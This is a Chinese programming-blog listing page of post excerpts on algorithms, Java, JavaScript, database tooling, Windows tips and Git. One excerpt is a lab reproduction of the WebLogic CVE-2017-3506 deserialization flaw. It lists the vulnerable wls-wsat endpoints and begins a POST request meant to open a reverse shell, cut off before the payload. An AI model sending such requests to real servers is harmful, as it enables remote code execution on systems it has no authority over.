在用数组模拟二叉树时，每个节点在数组中会有一个下标（编号）。当是满二叉树时，我们会按照层序遍历的顺序，依次给节点编号。
若根节点编号从1开始，则对于编号为x的节点，其左儿子的编号为2 * x，其右儿子的编号为2 * x + 1。
（根节点编号从1开始，计算比较方便；若根节点编号从0开始，则左儿子为2 * x + 1，右儿子为2 * x + 2）。
那么，将题目中这棵树看成满二叉树（为空的节点也认为是有节点），我们对每个节点进行编号。求某一层的宽度，只需要用该层最后一个节点的编号，减去该层第一个节点的编号，即可算出中间的长度。
对节点增加一个编号，可以通过创建一个新的数据结构来做，也可以用Map来保存每个节点对应的编号，也可以用Queue来对编号进行存储（因为每一次都是处理一层的节点），下面选择用Queue来存储节点编号
代码如下
class Solution { public int widthOfBinaryTree(TreeNode root) { if (root == null) return 0; // 需要计算每一层的宽度, 并从中取最大值, 用BFS来做 Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); Queue&lt;Integer&gt; indexQueue = new LinkedList&lt;&gt;(); int ans = 1; queue.offer(root); indexQueue.offer(1); while (!queue.isEmpty()) { // 将这一层的拿出来 int size = queue.size(); int left = 0; // 该层第一个节点的下标 int right = 0; // 该层最后一个节点的下标 for (int i = 0; i &lt; size; i++) { TreeNode node = queue.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7cbacf492fafd7c71e0bc215b3b49f30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02932cf132239cbad226c48e4c2b0817/" rel="bookmark">
			js中的class继承
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 class Person{ //构造器方法 constructor(name,age){ //构造器中的this指向的是--类的实例 this.name = name this.age = age } //一般方法 没有function哈哈哈 speak(){ //speak方法放在了--实例的原型对象__proto__上，供通过Person实例调用speak实例使用 //通过Person实例调用speak时，speak中的this指的是Person实例 console.log(`我叫${this.name},我${this.age}岁了`); //模板字符串用${} } } //继承 class Student extends Person{ constructor(name,age,grade){ super(name,age) this.grade = grade this.scholl = "霍格沃兹" } //重写 如果需要对父类方法修改 就需要重写继承过来的方法 speak(){ console.log(`我叫${this.name},我${this.age}岁了,我来自${this.grade}学院`) } //自己特有的方法 magic(m){ console.log(`我会${m}魔法`); } } const student = new Student("哈利波特",14,"格兰芬多") console.log('实例对象:',student); student.speak() student.magic("夺魂咒") 总结：
类中的构造器不是必须写的，要对实例进行一些初始化的操作，如添加指定属性时才写如果B类继承了A类，且B类中写了构造器，那么A类构造器中的super是必须要调用的类中所定义的方法，都是放在了类的原型对象上，供实例去使用 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49959872a0ac39bd2fe0699cf78abc01/" rel="bookmark">
			哈夫曼编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 哈夫曼编码 概念前缀码的二叉树及权值哈夫曼编码的设计思想 实例伪代码 概念 哈夫曼编码是一种字符编码方式，是可变长编码的一种，1952年提出，依据字符在文件中出现的频率来建立一个用0,1串表示各字符，使平均每个字符的码长最短的最优表现形式。
应用于图像压缩和大容量存储
为了正确解码，可变长编码必须满足，二元前缀码的性质：任何字符的代码都不能作为其他字符代码的前缀
非前缀码的例子
a：001， b：00，c：010，d：01
解码的歧义，例如字符串0100001
解码1：01，00，001 d, b, a
解码2：010，00，01 c，b，d
前缀码的二叉树及权值 哈夫曼编码的设计思想 以字符的使用频率做权构建一棵哈夫曼树，然后利用哈夫曼树对字符进行编码，称为哈夫曼编码具体是将所要编码的字符作为叶子节点，该字符在文件中的使用频率作为叶子节点的的权值，以自底向上的方式、通过执行n-1次的“合并”运算后构造出最终所要求的树，即哈夫曼树，它的核心思想是让权值大的叶子离根最近采用的贪心策略：每次从树的集合中取出双亲为0且权值最小的两棵树作为左、右子树，构造一棵新树，新树根节点的权值为其左右孩子节点权值之和，将新树插入到树的集合中 实例 对下图 a、b、c、d、e、f 六个字符进行哈夫曼编码
第一次：
下一步：
下一步：
下一步：
下一步：
一共2n-1个节点，合并了n-1次
最终结果：
伪代码 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09f4edc703e3661c528222a4b967eec4/" rel="bookmark">
			【数据压缩】--LZW算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 LZW算法原理LZW编码编码算法的思想数据结构分析主要功能模块初始化词典查找词典中是否有字符串将新串加入词典编码 LZW解码解码算法的思想解码LZWDecodeDecodeString 调试程序编码解码 压缩效率分析十种不同格式文件的压缩效率更改词典总数上限后的编码效率字符重复率很高的文本文档LZW算法的优缺点 程序代码 LZW算法原理 LZW编码 编码算法的思想 步骤1：将词典初始化为包含所有可能的单字符，当前前缀P初始化为空。
步骤2：当前字符C=字符流中的下一个字符。
步骤3：判断P+C是否在词典中：
（1）如果是，则用C扩展P，即P=P+C，返回到步骤2.
（2）如果否，则 输出与当前前缀P相对应的码字W;将P+C添加到词典中；令P=C,并返回到步骤2.
数据结构分析 尾缀字符suffix母节点parent第一个孩子节点firstchild下一个兄弟节点nextsibling 树用数组表示，数组下标用pointer表示，dict[pointer]表示一个节点：
dict[pointer].suffix
dict[pointer].parent
dict[pointer].firstchild
dict[pointer].nextsibling
struct { int suffix; int parent, firstchild, nextsibling; } dictionary[MAX_CODE+1]; int next_code; int d_stack[MAX_CODE]; // stack for decoding a phrase 主要功能模块 初始化词典 void InitDictionary( void){//初始化词典，将0-255根节点初始化 int i; for( i=0; i&lt;256; i++){ dictionary[i].suffix = i;//尾缀字符 dictionary[i].parent = -1;//母节点初始化为空 dictionary[i].firstchild = -1;//子节点初始化为空 dictionary[i].nextsibling = i+1;//下一个兄弟节点 } dictionary[255].nextsibling = -1;//最后一个节点无下一个兄弟 next_code = 256;//新词条编码为256 } 查找词典中是否有字符串 将当前字符依次与当前前缀的孩子节点进行比较，相同时说明词典中有该字符串，否则说明词典中没有该字符串，返回-1。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09f4edc703e3661c528222a4b967eec4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/abb21ec2a8eea10cce7518c3f3c47912/" rel="bookmark">
			关于国产数据库表设计PDManer工具的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于国产数据库表设计PDManer工具的使用 一 PDManer简介二 PDManer的使用1 简单案列说明1 界面说明2 内容说明1 数据表2 视图3 关系图4 数据字典 一直以来,对于数据库的表设计,都是采用PowerDesigner工具. 最近发现一款国产软件PDManer,在表设计方面,更加轻量化,更加灵活,也提供了更多的附加功能.
一 PDManer简介 PDManer是一款国产开源的简单好用的数据库建模工具.2018年推出开源公开版,历经数年,截止2022年4月17日推出最新版PDManer元数建模-v4.0版本.PDManer的主要特点就是:简单方便,轻量高效.
二 PDManer的使用 1 简单案列说明 1 界面说明 下载,安装软件,打开软件如下图.官方提供了两个案例模板,选择常见的电商商城模板
2 内容说明 电商模板的数据模型分为三大块,即消费端,商家端和平台端,一消费端为例.
1 数据表 数据库表主要由如下六张表.
双击数据表,如买家表,进入表结构设计,可新增,删除,修改表字段,注释,类型,以及是否为空,自增等特性(全中文化界面,上手方便)
点击数据库代码tag页,可以获取各个数据库对应的脚本语句,可直接获取使用.
点击程序代码,可以获取Java和C#的Bean对象代码
2 视图 视图主要是来创建数据库中的数据视图.
此模板没有视图,可鼠标右键,更加相关提示创建视图,界面操作,方便视图创建
3 关系图 关系图中,可以画一些业务流程图,方便整理数据表之前的关系,比较直观易懂.
关键数据表,可以展示各个表之间的结构关系,可通过字段来连接关系
4 数据字典 数据字典,就是平时使用的数据常量,如是否删除0否,1是等,可将定义的数据字典放到表结构中,也可以直接导出使用.
使用说明
PDManer元数建模-v4-操作手册 · 语雀 (yuque.com)
PDManer下载地址
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/605ad6e3349e2958b3c180c6cd0c5a18/" rel="bookmark">
			JavaScript——onload事件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		加载 JS 时出现Cannot read property 'appendChild' of null错误：
&lt;head&gt; &lt;script&gt; let li = document.createElement("li"); let text = document.createTextNode("广州"); /*将 广州 添加到li*/ li.appendChild(text); let box2 = document.querySelector(".box1 .box2"); console.log(box2); box2.appendChild(li); } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="box1"&gt; &lt;div class="box2"&gt;你好&lt;/div&gt; &lt;/body&gt; 定位：
经过筛查发现错误出现在对象box2段，box2为null。
querySelector查询不到选择器的字符串.box .box2。
问题原因：
检查代码发现，script标签写在页面上边，而浏览器中文档的加载顺序是自上而下，当读取querySelector(".box .box2")时 页面中html代码还未读取，因此导致box2对象为null，从而调用appendChild（）时出现Cannot read property 'appendChild' of null。
解决方法：
window.οnlοad=function(){}
onload事件在页面加载完后才触发，为window绑定onload事件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a54f09d70f386cc1d8ed0e6285870db/" rel="bookmark">
			【迷人的爪哇】—带你从零开始了解Java
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、Java语言概述
1.1 Java是什么
1.2 Java语言的重要性
1.2.1 Java语言的广泛适用性
1.3 Java语言的发展简史
1.5 Java开发环境安装
二、Java中的main方法
2.1 main函数的使用实例
2.2 运行Java程序
三、注释
3.1 基本规则
3.2 注释规范
四、标识符
一、Java语言概述 1.1 Java是什么 Java是一种优秀的程序设计语言，它具有令人赏心悦目的语法和易于理解的语义。不仅如此，Java还是一个有一系列计算机软件和规范形成的技术体系，这个技术体系提供完整的用于软件开发和跨平台部署的支持环境，并广泛应用于嵌入式系统、移动终端、企业服务器、大型机等各种场合。 1.2 Java语言的重要性 1.2.1 Java语言的广泛适用性 下图数据来自于TIOBE编程语言社区2017年12月和2018年10月最新的排行榜，常年占据语言排行榜榜首，是近些年最火的编程语言之一。
1.3 Java语言的发展简史 Java 语言源于 1991 年 4 月，Sun 公司 James Gosling博士 领导的绿色计划(Green Project) 开始启动，此计划最初的目标是开发一种能够在各种消费性电子产品(如机顶盒、冰箱、收音机等)上运行的程序架构。
这个就是Java的前身： Oak (得名与Java创始人James Gosling办公室外的一棵橡树)，但由于这些智能化家电的市场需求没有预期的高，Sun公司放弃了该项计划。随着1995年代互联网的发展Sun公司看见Oak在互联网上应用的前景，于是改造了Oak，于1995年5月以Java的名称正式发布，并提出“Write once, Run anywhere" 的口号。
具体发展史：https://baike.baidu.com/item/java/85979
1.5 Java开发环境安装 JDK安装视频： 史上最简单的JDK安装_哔哩哔哩_bilibili
IDEA下载网址：Download IntelliJ IDEA: The Capable &amp; Ergonomic Java IDE by JetBrains
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a54f09d70f386cc1d8ed0e6285870db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/457c2998e14ed354bf555a175c886977/" rel="bookmark">
			【Python 百炼成钢】GCD与LCM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 👾前言👾🍁前置知识🍁🤺练习🤺两个数的最大公因数多个数的最大公因数多个数的最大公倍数 一日一步,以至千里。༼ つ ◕‿◕ ༽つ 👾前言👾 因为博主最近比较忙所以好久没有进行更新,接下来几天会将基础算法更新完。
大家学习一个算法的时候,首先应该知道它是干啥的,然后理解其思路,最后再上手敲敲
因为算法这东西跟其他的还不一样,必须自己动手,否则看似自己会了，实际上差之千里。
刚开始看这两个名字你可能会觉得灰常的高大上,不明所以
其实GCD就是我们日常说到的最大公因数,LCM是我们日常说到的最小公倍数
你可能会问?为什么这么简单的题你还要将他拿出来说说呢？请带着疑问我们往下看。
🍁前置知识🍁 求最大公因数我们有两种方法：
辗转相除法(来自西方)：辗转相除，直到余数为0,得到的除数就是最大公因数
更相减损术(来自中国老祖宗)：更相减损，直到结果为0,得到的减数与被减数就是最大公因数
求最小公倍数的方法:
利用性质：a*b=gcd(a,b)*lcm(a,b)
🤺练习🤺 两个数的最大公因数 # 辗转相除法 def gcd(a,b): if a&lt;b: a,b=b,a temp=b while temp: temp=a%b a=b b=temp return a print(gcd(30,901)) # 更相减损术 def gcd(a,b): if a&lt;b: a,b=b,a temp=b while a!=b: temp=a-b if temp&gt;b: a=temp else: a=b b=temp return a print(gcd(300,100)) 两个数最大公倍数自己想想如何实现。
多个数的最大公因数 def gcd(a,b): if a&lt;b: a,b=b,a temp=b while temp: temp=a%b a=b b=temp return a def lsgcd(ls): n=len(ls) if n==1: return n elif n==2: return gcd(ls[0],ls[1]) return gcd(lsgcd(ls[:n//2]),lsgcd(ls[n//2:])) print(gcd(2,3)) print(lsgcd([15,6,9,21])) 多个数的最大公倍数 def lcm(a,b): ta=a tb=b if a&lt;b: a,b=b,a temp=b while temp: temp=a%b a=b b=temp return (ta*tb)//a def lslcm(ls): n=len(ls) if n==1: return n elif n==2: return lcm(ls[0],ls[1]) return lcm(lslcm(ls[:n//2]),lslcm(ls[n//2:])) print(lcm(2,3)) print(lslcm([15,6,9,21])) print(lslcm([1,2,3,4])) 一日一步,以至千里。༼ つ ◕‿◕ ༽つ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9123743664134d511547c5e6cdd72288/" rel="bookmark">
			ssh 执行远程命令卡住问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题现象 我这边执行的pc-ctl命令，这个是tidb的pd命令行工具
命令本地会自行的结果如下：
[root@centos7 ~]# /root/pd-ctl -u 10.226.157.132:2900 region { "count": 1, "regions": [ { "id": 2, "start_key": "", "end_key": "", "epoch": { "conf_ver": 128, "version": 9 }, "peers": [ { "id": 65, "store_id": 28 }, { "id": 66, "store_id": 11 }, { "id": 70, "store_id": 31 }, { "id": 71, "store_id": 4 }, { "id": 75, "store_id": 6 } ], "leader": { "id": 70, "store_id": 31 }, "approximate_size": 4986 } ] } [root@centos7 ~]# 但是通过ssh远程执行pd-ctl会卡住
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9123743664134d511547c5e6cdd72288/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02573edb19de45403b8613a60f092972/" rel="bookmark">
			图文并茂！推荐算法架构——粗排
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导语 | 粗排是介于召回和精排之间的一个模块，是典型的精度与性能之间trade-off的产物。理解粗排各技术细节，一定要时刻把精度和性能放在心中。
在上篇《详细解读！推荐算法架构——召回》中我们结合算法架构召回进行解读分析，本篇将深入重排这个模块进行阐述。
一、总体架构
粗排是介于召回和精排之间的一个模块。它从召回获取上万的候选item，输出几百上千的item给精排，是典型的精度与性能之间trade-off的产物。对于推荐池不大的场景，粗排是非必选的。粗排整体架构如下：
二、粗排基本框架：样本、特征、模型
目前粗排一般模型化了，基本框架也是包括数据样本、特征工程、深度模型三部分。
（一）数据样本 目前粗排一般也都模型化了，其训练样本类似于精排，选取曝光点击为正样本，曝光未点击为负样本。但由于粗排一般面向上万的候选集，而精排只有几百上千，其解空间大很多。只使用曝光样本作为训练，但却要对曝光和非曝光同时预测，存在严重的样本选择偏差（SSB问题），导致训练与预测不一致。相比精排，显然粗排的SSB问题更严重。
（二）特征工程 粗排的特征也可以类似于精排，由于其计算延迟要求高，只有10ms~20ms，故一般可以粗分为两类：
普通特征：类似精排，user、context、item三部分。有哪些特征，以及特征如何处理，可以参看精排的特征工程部分。
交叉特征：user和item之间的交叉特征，对提升模型精度很有帮助。但由于交叉特征枚举过多，难以离线计算和存储。实时打分时又不像user特征只用计算一次，延迟较高。故对于交叉特征要谨慎使用。
（三）深度模型 粗排目前已经基本模型化，其发展历程主要分为四个阶段：
第一代：人工规则策略，可以基于后验统计，构建一个人工规则。比如融合item的历史CTR、CVR、类目价格档、销量等比较核心的因子。人工规则准确率低，也没有个性化，也不可能实时更新。
第二代：LR线性模型，有一定的个性化和实时性能力，但模型过于简单，表达能力偏弱。
第三代：DSSM双塔内积深度模型。它将user和item进行解耦合，分别通过两个Tower独立构建。从而可以实现item向量离线存储，降低线上predict延迟。主要有两种范式：
item和user均离线存储。这个方案只需要计算user和item的内积即可，计算延迟低。由于user是离线存储的，故可以使用复杂的模型，提升表达能力。但user侧的实时性较差，对于用户行为不能实时捕捉。
item离线，user实时。item相对user，实时性要求没那么高。由于一次打分是针对同一个用户的，故user侧只需要实时计算一次即可，速度也很快。目前这个方案使用较多。
第四代：item和user隔离，导致二者没有特征交叉能力，模型表达能力弱。故又提出了以COLD为代表的第四代模型，轻量级MLP粗排模型。它通过SE block实现特征裁剪，并配合网络剪枝和工程优化，可以实现精度和性能之间的trade-off。
三、粗排优化
粗排的几个主要问题：
精度和特征交叉问题：经典的DSSM模型优点很多，目前在粗排上广泛应用，其最核心的缺点就是缺乏特征交叉能力。正所谓成也萧何败萧何，正是由于user和item分离，使得DSSM性能很高。但反过来也是由于二者缺乏交叉，导致模型表达能力不足，精度下降。典型的精度和性能之间的trade-off。
低延迟要求：粗排延迟要求高，一般只有10ms~20ms，远低于精排的要求。
SSB问题：粗排解空间比精排大很多，和精排一样只使用曝光样本，导致严重的样本选择偏差问题。
（一）精度提升 精度提升的方案主要有精排蒸馏和特征交叉，主要还是要优化特征交叉问题。
精排蒸馏 精排模型作为teacher，对粗排模型进行蒸馏学习，从而提升粗排效果，这已经成为了目前粗排训练基本范式
特征交叉 特征交叉可以在特征层面，也可以在模型层面实现。特征层面就是手工构造交叉特征，作为模型底层输入，仍然可以在独立的Tower中。模型层面则使用FM或者MLP等实现自动交叉。主要方法有：
特征蒸馏：teacher和student使用相同的网络结构，teacher模型使用普通特征和交叉特征，student则只使用普通特征。student从teacher中可以学到交叉特征的高阶信息。
加入交叉特征：特征层面构建手工交叉特征，独立的Tower中使用。由于交叉特征难以离线存储，实时计算空间也很大，故这个独立的Tower不能过于复杂。那我们第一时间就想到了wide&amp;deep模型。deep部分仍然使用DSSM双塔，wide部分则为交叉特征。
轻量级MLP：模型层面实现特征交叉，不进行独立分塔。比如COLD，通过特征裁剪、网络剪枝、工程优化等方式降低时延，而不是靠独立分塔。
（二）延迟降低 精度和性能一直以来都是一个trade-off，很多方案都是在二者之间寻找平衡。粗排的性能要求更高，其延迟必须控制在10ms~20ms以内。性能优化有很多常见方法。
主要有以下方法：
特征裁剪：如COLD，不重要的特征先滤掉，自然就降低了整体延迟。这一层可以做在模型内，从而可以个性化和实时更新。
量化和定点化：比如32bit降低为8bit，可以提升计算和存储性能。
网络剪枝：network pruning，包括突触剪枝、神经元剪枝、权重矩阵剪枝等方法，不展开了。
模型蒸馏：model distillation，上文已经提到了，不展开了。
网络结构搜索NAS：使用更轻量级，效果更好的模型。可以尝试网络结构搜索NAS。
（三）SSB问题 粗排解空间比精排大很多，和精排一样只使用曝光样本，导致严重的样本选择偏差问题。可以把未曝光样本的精排打分给利用起来，缓解SSB问题。
作者简介
谢杨易
腾讯应用算法研究员
腾讯应用算法研究员，毕业于中国科学院，目前在腾讯负责视频推荐算法工作，有丰富的自然语言处理和搜索推荐算法经验。
推荐阅读
详细解读！推荐算法架构——召回
超强指南！推荐算法架构——重排
图文解读：推荐算法架构——精排！
第四届 Techo TVP 开发者峰会回来了！这次我们线上见
来了！Go的2个黑魔法技巧
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a494c6213ca9caf8380b441c99182d8/" rel="bookmark">
			Weblogic 常见漏洞汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。
WebLogic XMLDecoder反序列化漏洞（CVE-2017-3506） 0x00 漏洞描述 网上爆出weblogic的WLS组件存在xmldecoder反序列化漏洞，直接post构造的xml数据包即可rce。
0x01 受影响WebLogic版本 10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0。
0x02 漏洞复现 靶机IP：192.168.190.136
攻击机：192.168.190.1
可能存在漏洞路径
/wls-wsat/CoordinatorPortType，/wls-wsat/RegistrationPortTypeRPC,
/wls-wsat/ParticipantPortType，/wls-wsat/RegistrationRequesterPortType，
/wls-wsat/CoordinatorPortType11，/wls-wsat/RegistrationPortTypeRPC11，
/wls-wsat/ParticipantPortType11，/wls-wsat/RegistrationRequesterPortType11
1、使用vulhub搭建环境，并启动
切换到 /opt/vulhub/weblogic/CVE-2017-10271/ 目录下
执行 docker-compose up -d
2、访问 http://192.168.190.136:7001/wls-wsat/RegistrationRequesterPortType ，响应出现 Web Services证明存在该漏洞。
执行反弹shell命令
POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1 Host: 192.168.190.136:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: text/xml Content-Length: 841 &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a494c6213ca9caf8380b441c99182d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d07e6f5a9a9abd8965d155d6dd8dec44/" rel="bookmark">
			Android studio 实现打电话发短信浏览网页功能 android开发小实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android studio 实现打电话发短信浏览网页功能 android开发小实验 目标：
android studio 实现打电话 发短信 浏览网站的功能
先在布局里面定义几个按钮 分别为
打电话 发短信 浏览网页 三个按钮 ，当我们点击相应的按钮 就能执相应的工作
先看一下效果图
打电话
发短信
浏览网页
布局源码
activity_call_browser_msg.xml
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" tools:context=".CallBrowserMsgActivity"&gt; &lt;LinearLayout android:orientation="horizontal" android:layout_width="match_parent" android:layout_height="wrap_content" tools:ignore="MissingConstraints"&gt; &lt;Button android:background="@drawable/button_bg" android:id="@+id/button1" android:textSize="20dp" android:layout_weight="1" android:text="btunex" android:layout_width="match_parent" android:layout_height="wrap_content"&gt; &lt;/Button&gt; &lt;Button android:background="@drawable/button_bg" android:id="@+id/call" android:textSize="20dp" android:layout_weight="1" android:text="打电话" android:layout_width="match_parent" android:layout_height="wrap_content"&gt; &lt;/Button&gt; &lt;Button android:background="@color/teal_200" android:id="@+id/browser" android:textSize="20dp" android:layout_weight="1" android:text="浏览网页" android:layout_width="match_parent" android:layout_height="wrap_content"&gt; &lt;/Button&gt; &lt;Button android:background="@color/purple_200" android:id="@+id/message" android:textSize="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d07e6f5a9a9abd8965d155d6dd8dec44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc1803fd153b8e468f297d00c40df8ec/" rel="bookmark">
			Windows系统下MD5，SHA1或者SHA256三种校验方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 初步介绍
当我们从网上下载软件时，发行商为了保证用户在下载过程中自己的软件没有被更改，都会通过一些哈希函数来确保他们软件的完整性。比如：在网上有一些攻击者会在其中植入像插件，广告或病毒等等恶意代码，相信一些朋友有过类似的体验，特别是在从非官方的网站上下载安装软件的时候。
所以用户是有必要对软件的完整性做一个检验的，目前常用的哈希函数是SHA256（因为它更安全一些），所以在此介绍如何Windows检验一个文件的SHA256的哈希值，对SHA1和MD5的检查也是类似的。（超简单的，有手就行！）
现在介绍一下我的自身经历，当我从官网上下载一个 boost_1_79_0.zip软件，同时官网会附带一个SHA256文件，里面存放的是软件的正确哈希值，而我需要做的就是对自己下载的软件做SHA256哈希计算，并将这个结果与正确的哈希值进行比对。如果结果是一样的，那么软件就是OK的。
检查方式
Windows系统下MD5，SHA1或者SHA256三种校验值查询方法
打开cmd，进入需要校验的文件的绝对路径下。
格式：certutil -hashfile 绝对路径下文件 校验值
格式：certutil -hashfile 绝对路径下文件 校验值 举例：
certutil -hashfile C:\Users\Downloads\boost_1_79_0.zip SHA256 certutil -hashfile C:\Users\Downloads\boost_1_79_0.zip SHA1 certutil -hashfile C:\Users\Downloads\boost_1_79_0.zip MD5 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7ef518308a2f038fc1cc204d1586a79/" rel="bookmark">
			Java小项目谁看谁都会（图书管理）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在我之前的几篇博客中对于Java语法，思想等等进行了总结，但是还是差点那味，就是没有将这些知识串起来那么今天的这篇博客我就将Java中：类 对象 封装 继承 多态 抽象类 接口等等知识共同使用完成一个Java的小项目一起来看
介绍 我们先来看看这个小项目都有什么功能
可以看到通过输入姓名和身份可以有不同的操作选择，增删查改呀之类的看起来挺简单的我们就来实现以下，我们来看一下所用到的类
知道了功能和类我们就来实现这个项目
实现 book包 在这个包中我们定义了两个类：Book和BookList分别来说以下
在Book类中我定义了书的名字，作者，类型，价格等成员变量，并且使用private修饰提供getset方法来体现封装，提供了构造方法，重写了toString方法方便进行打印，代码很简单看看就可以
package book; public class Book { private String name; private String author; private int price; private String type; private boolean isBorrowed; public Book(String name, String author, int price, String type) { this.name = name; this.author = author; this.price = price; this.type = type; } public String getName() { return name; } public void setName(String name) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7ef518308a2f038fc1cc204d1586a79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/654fc90e7f38bd17025e38f9e21947f1/" rel="bookmark">
			Win11电脑第一次开机怎么跳过登录？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		升级完Win11系统首次使用必须联网且登录微软账号，但是有用户不想这么做，那Win11第一次开机要怎么跳过联网登录微软账户？下面我们就来看看详细的操作！
石大师U盘装系统大师下载_石大师U盘重装系统官方版下载 - 系统之家
石大师系统重装最新版下载_石大师一键重装官方下载 - 系统之家
不联网就不给登录吗？
经过小编实际体验，在Windows11家庭版中，当我们首次登录系统时，确实会提示进入网络连接窗口，而且完全没有“跳过”的选项，必须联网然后使用微软账户才能登录。
如果用户在完全没法联网的地方，就真的无法登录Windows11登录了？别着急，其实有办法绕开联网环节，直接登录系统。现在小编就教你跳过联网直接进入Windows11的方法，赶快收藏起来吧！
怎么跳过联网环节
步骤一：首次登录Windows11后，在联网窗口按下“Shift+F10”快捷键，这可以打开cmd命令提示符，紧接着输入“taskmgr”命令，该命令可以打开任务管理器。
步骤二：在任务管理器中点击左下角“详细信息”，找到程序名是oobenetworkconnectionflow.exe，右键点击它并结束进程，或者进程里找到“Network Connection Flow”，中文名“网络连接流”，结束它，此时联网窗口会直接关闭，我们就可以进入创建本地账户页面了。
或者打开命令提示符的时候直接输入 taskkill /F/IM oobenetworkconnectionflow.exe 结束上述进程。
上述方式可以跳过在线联网登录微软账户的步骤，不过小编还是建议大家在有网的时候联网登录微软账号比较好，微软官方表示，通过联网并登录微软账户可以享受更多功能与体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef54009cf6683550bf462522f4201cc5/" rel="bookmark">
			idea集成gitee和使用操作Gitee
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
git创建本地和克隆远程仓库
从远程仓库克隆(重要)
idea操作本地仓库
idea操作远程仓库
查看远程仓库
添加远程仓库
推送至远程仓库
从远程仓库拉取
分支操作
将本地项目分享到Gitee远程仓库
git创建本地和克隆远程仓库 先在idea导入git 的安装目录：（本地要先安装git）
然后点击test，看有没有出现git的版本信息；
获取本地git仓库：两种方法
一、本地初始化仓库：
第一步：
第二步：点击，create git ropository ,然后会让你选择需要版本控制的项目
第三步：点击确认后，就会在相应的项目目录，创建一个隐藏的文件夹.git 这个就是git本地仓库文件 而且idea对应的项目也会出现一些变化：
从远程仓库克隆(重要) 从远程仓库克隆（工作中的常用方式）
这个可以自己选择克隆的本地位置；可以直接把远程仓库的代码都克隆到本地；
远程克隆下来的项目会自带一个文件： .gitignore 文件，在里面的信息是代表哪些文件不需要交给git管理；
idea操作本地仓库 将文件加入暂存区：
什么时候需要把文件加入暂存区？添加新的文件的时候，对已有文件进行修改的时候；
①把文件加入暂存区；
